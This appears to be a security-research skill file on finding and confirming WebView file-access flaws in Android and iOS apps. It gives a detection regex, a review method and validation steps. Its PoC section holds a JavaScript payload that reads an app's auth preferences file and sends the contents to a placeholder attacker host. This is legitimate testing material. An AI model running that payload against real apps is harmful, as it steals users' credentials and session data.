---
name: mhunt-webview-file-access
description: Mobile hunting skill for webview file access on Android/iOS apps. Ported from droid-llm-hunter vuln_rule 'webview_file_access'. MASVS-PLATFORM-2 (WebView File Access Control). Use when /hunt-mobile (via mhunt-dispatch) fires this rule's detection_pattern, or when hunting webview file access in a decompiled app.
source: droid-llm-hunter (config/prompts/vuln_rules/webview_file_access.yaml)
masvs: MASVS-PLATFORM-2
---

# mhunt-webview-file-access

port of droid-llm-hunter's `webview_file_access` vuln_rule into the `/hunt-mobile` model. **WebView File Access** — `setAllowFileAccess`/`setAllowFileAccessFromFileURLs`/`setAllowUniversalAccessFromFileURLs` set true lets a local (or XSS-injected) page read other local files and the app's cookies/DB.

## MASVS

`MASVS-PLATFORM-2` — WebView File Access Control. likely severity: **High** (confirm via the Gate-0 below; mobile severity depends on reachability + impact, not the pattern alone).

## Detection signal (the rule's `detection_pattern`)

android (smali/java/xml) — grep verbatim:

```
setAllow(File|Universal)Access(FromFileURLs)?\s*\(?\s*true
```

ios parallel: `WKWebViewConfiguration.preferences` / `allowFileAccessFromFileURLs = YES` or `loadFileURL:allowingReadAccessToURL:` with a too-broad directory

a regex hit is a **lead, not a finding** — droid-llm-hunter then deep-scans it with the LLM. that deep-scan is the methodology below.

## Static methodology (deep scan)

- Find any of the three `setAllow*Access*` settings explicitly `true`.
- `AllowUniversalAccessFromFileURLs(true)` is worst — a `file://` page can XHR any origin and read the response (SOP fully disabled).
- Reachable if the app loads a `file://` URL whose path is attacker-influenced (exported component, download dir, deep link).

## Dynamic confirmation

- Get the app to load a hostile local HTML (drop via an exported component or shared dir), then have it fetch `file:///data/data/com.target/databases/...`.

device prereqs: rooted Android emulator/device with `adb` + `frida-server` (and `drozer`/`objection` where noted), or a jailbroken iOS device with `frida`/`objection`. no device -> report as a static-only lead, don't claim confirmed.

## PoC

```javascript
// hostile local page loaded by a WebView with universal file access:
var x = new XMLHttpRequest();
x.open('GET','file:///data/data/com.target/shared_prefs/auth.xml');
x.onload = () => new Image().src='https://attacker/?d='+btoa(x.responseText);
x.send();
```

## Validation — MASVS Gate-0

before writing the report, answer all three:

1. **Reachability** — can an *external* actor trigger this (another app, a deep link, a network response, a shared file), or only the app itself? app-internal-only is usually not a finding.
2. **Impact** — what does the attacker gain (data read/write, code execution, auth bypass, privilege gain) and which CIA property does the victim lose? map to `MASVS-PLATFORM-2`.
3. **Reproducible in 10 min** — exact entry point (component/URI/intent) + payload + observed result (leaked data / state change / execution), on a clean install, no pre-seeded state.

if any answer is weak, it's a static lead — keep hunting, don't file.

## Chains

file read -> harvest `mhunt-insecure-storage` secrets / cookies -> session theft.
